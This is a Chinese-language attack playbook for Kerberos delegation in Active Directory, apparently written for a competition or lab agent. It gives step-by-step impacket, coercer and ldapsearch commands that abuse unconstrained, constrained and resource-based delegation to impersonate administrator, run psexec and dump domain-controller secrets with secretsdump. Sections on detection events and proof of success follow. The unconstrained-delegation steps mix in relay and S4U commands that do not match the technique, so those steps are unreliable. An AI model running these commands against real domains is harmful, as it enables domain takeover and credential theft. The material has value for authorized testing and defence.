# Kerberos 委派：三种边、票据字段、验伤判据

> 被 `competition-kerberos-delegation` 引用。核心不是「有没有 Kerberos」，而是
> **是哪一种委派边、铸了什么票、哪个服务真的接受了它**。

## 一、先分清三种边（判错就全错）

| 类型 | 判据（怎么认出来） | 攻击路径 | 关键前提 |
| --- | --- | --- | --- |
| **非约束委派** | 账户 `userAccountControl` 含 `TRUSTED_FOR_DELEGATION` (0x80000) | 诱使该账户所在主机的机器账户来认证 → 截获 TGT → 重放 | 目标账户/主机有该标志 |
| **约束委派** | `msDS-AllowedToDelegateTo` 有 SPN 列表 | S4U2Self 取可转发票 → S4U2Proxy 换成目标 SPN 的票 | 服务账户 + 至少一个可委派 SPN |
| **RBCD（基于资源）** | 目标计算机对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 非空 | 拿到目标对象的写权限 → 写入自己控制的机器账户 SID → S4U2Self+S4U2Proxy | **对目标计算机对象有 GenericWrite/WriteProperty** |
| 协议转换 | `TRUSTED_TO_AUTH_FOR_DELEGATION` (0x1000000) | 无需用户交互即可 S4U2Self | 通常与约束委派同现 |

**枚举（先看有没有边，再看能不能用）**：

```bash
# 全量找人/机器上的委派标志（需域内一个普通账号）
impacket-findDelegation CORP.LOCAL/user:pass -dc-ip 10.0.0.10

# 直接查目录属性（LDAP 查询更可控）
ldapsearch -x -H ldap://10.0.0.10 -D 'user@corp.local' -w 'pass' \
  -b 'DC=corp,DC=local' '(userAccountControl:1.2.840.113556.1.4.803:=524288)' \
  sAMAccountName userAccountControl
# 524288 = 0x80000 非约束；16777216 = 0x1000000 协议转换

# RBCD：找所有 msDS-AllowedToActOnBehalfOfOtherIdentity 非空的计算机
ldapsearch -x -H ldap://10.0.0.10 -D 'user@corp.local' -w 'pass' \
  -b 'DC=corp,DC=local' '(&(objectClass=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))' \
  sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity
```

## 二、三种路径的可执行步骤

### 非约束委派（最经典，但需要"诱骗"）

```bash
# 1) 起监听，等目标主机的机器账户来认证
impacket-ntlmrelayx -t ldap://10.0.0.10 --delegate-access -smb2support

# 2) 诱使（授权范围内）：
#    - 打印机漏洞（PrinterBug）：SpoolSample / coercer
python3 coercer.py corp.local/user:pass@10.0.0.20 -l 10.0.0.99 -d

# 3) 拿到 TGT 后导出并使用
impacket-getST -spn 'cifs/fs01.corp.local' -impersonate administrator \
  CORP.LOCAL/svc_unconstrained:pass -dc-ip 10.0.0.10
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass fs01.corp.local
```

### 约束委派（S4U 两步）

```bash
# S4U2Self 拿"可转发"的票给任意用户，S4U2Proxy 换成目标服务的票
impacket-getST -spn 'cifs/dc01.corp.local' -impersonate administrator \
  CORP.LOCAL/svc_constrained:pass -dc-ip 10.0.0.10 -force-forwardable
export KRB5CCNAME=administrator@cifs_dc01.corp.local@CORP.LOCAL.ccache
impacket-secretsdump -k -no-pass dc01.corp.local
```

**`-force-forwardable` 是成败关键**：不加它，S4U2Self 给的票没有 FORWARDABLE 标志，
S4U2Proxy 会拒。加了还失败说明账户没有 `TRUSTED_TO_AUTH_FOR_DELEGATION`。

### RBCD（最现代，只需要一次写权限）

```bash
# 前提：对目标计算机对象有 GenericWrite（如 GenericAll on Computer）
# 1) 建一个自己控制的机器账户（MachineAccountQuota > 0 时可直接建）
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'P@ss123' \
  -dc-ip 10.0.0.10 CORP.LOCAL/user:pass

# 2) 把 EVIL$ 的 SID 写进目标的 msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write \
  -dc-ip 10.0.0.10 CORP.LOCAL/user:pass

# 3) 用 EVIL$ 走 S4U 拿目标上的管理员票
impacket-getST -spn 'cifs/target.corp.local' -impersonate administrator \
  -hashes :NTHASH_OF_EVIL CORP.LOCAL/EVIL$ -dc-ip 10.0.0.10

# 4) 打完必须清理（否则留后门痕迹，也不合规）
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action clear \
  -dc-ip 10.0.0.10 CORP.LOCAL/user:pass
```

## 三、票据字段必须记录的（报告缺一项就不算证明）

```
principal       发起方（谁的身份）
edge            委派类型 + 具体对象/SPN
ticket          TGT / TGS；S4U2Self 还是 S4U2Proxy
flags           forwardable / forwarded / proxiable / renewable
enctype         etype（23=RC4, 17/18=AES）；RC4 说明可能降级过
pac             有无 PAC、含哪些组 SID（这是"拿到什么权限"的依据）
cache           票据缓存路径（复现要用）
accepting svc   真正接受这张票的服务（不是目标 SPN 就行，要看服务是否真用）
```

**用 klist 看字段**：

```bash
klist -e -f    # 显示 flags 与 enctype
```

## 四、验伤：怎么证明「票真被接受了」

这是最容易作假的一步——**有票 ≠ 有权限**。要证明：

| 证据 | 怎么看 |
| --- | --- |
| 服务端真的做了认证 | 目标主机安全日志 **4624 类型 3（网络登录）** 且 `Authentication Package = Kerberos` |
| 拿到的是管理员 | 4624 里的 `TargetUserName` 是目标账户，`Elevated Token = Yes` |
| 服务没拒绝 | 服务端 **4769**（TGS 请求）配对成功，`Status = 0x0` |
| 操作留下了痕迹 | 目标上的实际动作（读到了 `\target\c$` 的文件列表 / 执行了命令回显） |

**反例（看起来成功其实是假）**：

- `getST` 成功但 `psexec` 连不上——票的 SPN 与目标服务不匹配
- `klist` 有票但访问 401/拒绝——票是给错的用户，或服务未启用委派信任
- 只在 KDC 日志看到 4769，目标主机 4624 没有——**KDC 发了票但服务没用**

## 五、检测视角

| 手法 | 日志 | 信号 |
| --- | --- | --- |
| S4U2Self | DC **4769** + `Transited Services` 字段非空 | 同一账户短时间内大量 S4U 请求 |
| S4U2Proxy | DC **4769** `Service Name` 是敏感 SPN（`krbtgt`/`cifs/DC`） | 非服务账户请求高权 SPN |
| RBCD 写入 | DC **5136**（目录对象修改） | `msDS-AllowedToActOnBehalfOfOtherIdentity` 被改 |
| 机器账户新建 | DC **4741** | `MachineAccountQuota` 被消费，非域管新建 `XXX$` |
| 非约束委派诱骗 | 目标主机 4624 类型 3 + 同时间段 4769 缺 TGS | 主机向外部地址发起认证 |

**被拦后三步定位**：① 看 KDC 返回码（`KDC_ERR_BADOPTION` = 策略不允许，不是网络问题）；
② 查账户 `userAccountControl` 是不是真没有委派标志；③ 最后才怀疑 EDR 拦了 LDAP 写入。

## 六、常见坑

1. **混淆「有委派标志」和「可被利用」**——非约束委派还要能**诱使**目标来认证，很多目标不听使唤。
2. **RBCD 写入后忘记清理**——这是留后门，合规上算越界。
3. **拿 SPN 当服务**——SPN 是注册的名字，服务要真的在跑且真的用 Kerberos 认证。
4. **AES 环境用 RC4 票**——会触发 `0x1F`（enctype 不支持），需要确认域是否禁用 RC4。
5. **`-force-forwardable` 不生效**——多半是账户缺 `TRUSTED_TO_AUTH_FOR_DELEGATION`，
   或者目标 SPN 不在 `msDS-AllowedToDelegateTo` 列表里。
